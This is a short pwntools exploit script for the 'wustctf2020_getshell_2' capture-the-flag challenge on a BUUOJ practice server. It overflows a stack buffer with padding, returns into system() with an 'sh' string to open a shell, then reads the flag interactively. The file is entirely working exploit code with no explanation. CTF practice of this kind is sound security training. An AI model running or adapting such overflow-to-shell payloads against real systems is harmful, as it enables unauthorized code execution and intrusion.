from pwn import *
from LibcSearcher import *

import utils

context.arch = 'i386'
context.log_level = 'debug'

target = remote('node4.buuoj.cn', 29807)

elf = ELF('../wustctf2020_getshell_2')
libc = ELF('/home/kali/glibc-all-in-one/libs/2.23-i386/libc-2.23.so')

system = 0x08048529
sh = 0x08048670

payload = b'a' * 0x18 + b'a' * 0x4 + p32(system) + p32(sh)
target.recv()
target.sendline(payload)
target.sendline('cat flag')
target.interactive()

